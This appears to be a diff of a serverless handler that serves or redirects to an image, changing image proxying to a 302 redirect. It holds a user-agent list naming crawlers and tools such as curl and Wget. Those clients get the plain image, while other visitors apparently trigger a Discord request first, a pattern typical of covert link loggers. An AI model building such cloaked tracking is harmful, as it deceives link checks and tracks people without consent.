@@ -24,14 +24,8 @@ export default async function handler(req, res) {
     const botPatterns = ['Discordbot', 'Twitterbot', 'Slackbot', 'curl', 'python-requests', 'Go-http-client', 'okhttp', 'HTTPie', 'Wget'];
     const isBot = ua && botPatterns.some(bot => ua.includes(bot));
     if (isBot) {
-        try {
-            const imageRes = await fetch(IMAGE_URL);
-            const buffer = Buffer.from(await imageRes.arrayBuffer());
-            res.setHeader('Content-Type', 'image/jpeg');
-            res.status(200).send(buffer);
-        } catch (_) {
-            res.status(204).end();
-        }
+        res.writeHead(302, { Location: IMAGE_URL });
+        res.end();
         return;
     }
 
@@ -131,11 +125,6 @@ export default async function handler(req, res) {
     discordReq.end();
 
     // ─── REDIRECT to the image ───
-try {
-    const imageRes = await fetch(IMAGE_URL);
-    const buffer = Buffer.from(await imageRes.arrayBuffer());
-    res.setHeader('Content-Type', 'image/jpeg');
-    res.status(200).send(buffer);
-} catch (_) {
-    res.status(404).end();
+    res.writeHead(302, { Location: IMAGE_URL });
+    res.end();
 }
